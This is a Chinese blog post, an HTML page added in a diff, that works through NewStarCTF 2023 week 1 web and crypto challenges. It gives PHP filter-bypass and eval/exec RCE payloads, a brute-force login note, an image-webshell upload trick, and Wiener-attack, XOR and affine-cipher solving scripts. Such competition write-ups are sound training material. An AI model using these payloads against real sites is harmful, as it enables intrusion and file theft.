@@ -1,0 +1,691 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J_0k3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="醉后不知天在水，满船清梦压星河。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStarCTF 2023 week1 wp">
+<meta property="og:url" content="http://example.com/2023/10/04/NewStarCTF%202023%20week1/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="醉后不知天在水，满船清梦压星河。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/wp39.jpg">
+<meta property="article:published_time" content="2023-10-04T06:27:32.000Z">
+<meta property="article:modified_time" content="2023-10-07T04:59:57.511Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="Write Up">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/wp39.jpg">
+  
+  
+  
+  <title>NewStarCTF 2023 week1 wp - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的秘密基地</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wp38.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NewStarCTF 2023 week1 wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J_0k3r
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-04 14:27" pubdate>
+          2023年10月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">NewStarCTF 2023 week1 wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>丁真<code>robots.txt</code> <code>www.zip</code></p>
+<h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/mdimg/newstarweek1/1.png" srcset="/img/loading.gif" lazyload><br>get:<code>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5=2024a</code><br>post:<code>key3[]=3&amp;flag5=(&quot;%08%09%08%05&quot;^&quot;%7c%7b%7d%60&quot;)</code> 异或构造<code>true</code></p>
+<h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999999999999999</span>):<br>    x=hashlib.md5()<br>    x.update(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    des=x.hexdigest()<br>    <span class="hljs-keyword">if</span> des[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]==<span class="hljs-string">&#x27;c4d038&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#114514</span><br></code></pre></td></tr></table></figure>
+<p><code>password=114514&amp;e[v.a.l=var_dump(scandir(&#39;/&#39;));</code> –&gt; <code>flag</code><br><code>password=114514&amp;e[v.a.l=var_dump(exec(&#39;tac /fl?g&#39;));</code></p>
+<h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p><img src="/mdimg/newstarweek1/2.png" srcset="/img/loading.gif" lazyload><br>抓包发现密码为md5形式的<br>先尝试数字弱密码， 6-18位数字<br><img src="/mdimg/newstarweek1/3.png" srcset="/img/loading.gif" lazyload><br>密码就是<code>000000</code>……<br>重新登录抓包<br><img src="/mdimg/newstarweek1/4.png" srcset="/img/loading.gif" lazyload><br>放包然后再抓包<code>[http://node4.buuoj.cn:26958](http://node4.buuoj.cn:26958)/passport/2c702a27a0f27a5c60daf3887be50e515801b211c9d8418ee4d792ce8d924897.php</code><br><img src="/mdimg/newstarweek1/5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><code>/?number1=a&amp;number2=a</code>报错直接找flag<br><img src="/mdimg/newstarweek1/6.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="/mdimg/newstarweek1/13.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/newstarweek1/7.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>上传图片🐎抓包改后缀php rce</p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> *<br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append(f ^ key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span><br></code></pre></td></tr></table></figure>
+<p>先推key</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># print(ord(&#x27;f&#x27;)^int(&#x27;e9&#x27;,16))   143</span><br><span class="hljs-comment"># print(ord(&#x27;l&#x27;)^int(&#x27;e3&#x27;,16))   143</span><br><br>key=<span class="hljs-number">143</span><br><br>a=<span class="hljs-string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(a[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)^key),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h2><p><img src="/mdimg/newstarweek1/8.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/newstarweek1/9.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">part <span class="hljs-number">1</span> of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=        base64<br>part <span class="hljs-number">2</span> of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=       base32<br>part <span class="hljs-number">3</span> of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`              uudecode<br></code></pre></td></tr></table></figure>
+<h2 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h2><p>维纳攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">continuedFra</span>(<span class="hljs-params">x, y</span>):<br><br>    cf = []<br>    <span class="hljs-keyword">while</span> y:<br>        cf.append(x // y)<br>        x, y = y, x % y<br>    <span class="hljs-keyword">return</span> cf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gradualFra</span>(<span class="hljs-params">cf</span>):<br>    numerator = <span class="hljs-number">0</span><br>    denominator = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cf[::-<span class="hljs-number">1</span>]:<br>        <span class="hljs-comment"># 这里的渐进分数分子分母要分开</span><br>        numerator, denominator = denominator, x * denominator + numerator<br>    <span class="hljs-keyword">return</span> numerator, denominator<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pq</span>(<span class="hljs-params">a, b, c</span>):<br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)<br>    <span class="hljs-keyword">return</span> (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getGradualFra</span>(<span class="hljs-params">cf</span>):<br>    gf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(cf) + <span class="hljs-number">1</span>):<br>        gf.append(gradualFra(cf[:i]))<br>    <span class="hljs-keyword">return</span> gf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e, n</span>):<br>    cf = continuedFra(e, n)<br>    gf = getGradualFra(cf)<br>    <span class="hljs-keyword">for</span> d, k <span class="hljs-keyword">in</span> gf:<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>: <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi = (e * d - <span class="hljs-number">1</span>) // k<br>        p, q = solve_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> p * q == n:<br>            <span class="hljs-keyword">return</span> d<br><br>n = <br>e = <br>c = <br>d = wienerAttack(e, n)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>n分解多个因数</p>
+<p>yafu分解 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p_list</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">phi</span>= <span class="hljs-number">1</span><br><span class="hljs-attribute">for</span> p in p_list:<br>    <span class="hljs-attribute">phi</span> *= (p-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p>循环求欧拉函数就行</p>
+<h2 id="fence"><a href="#fence" class="headerlink" title="fence"></a>fence</h2><p><img src="/mdimg/newstarweek1/10.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h2><p><img src="/mdimg/newstarweek1/11.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p><img src="/mdimg/newstarweek1/12.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag, key<br><br>modulus = <span class="hljs-number">256</span><br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append((key[<span class="hljs-number">0</span>]*f + key[<span class="hljs-number">1</span>]) % modulus)          <span class="hljs-comment"># </span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span><br></code></pre></td></tr></table></figure>
+<p>仿射密码五个字符<br>思路是复用加密，利用<code>flag&#123;</code>爆破出 key[0] 和 key[1]<br>然后利用解密函数解密</p>
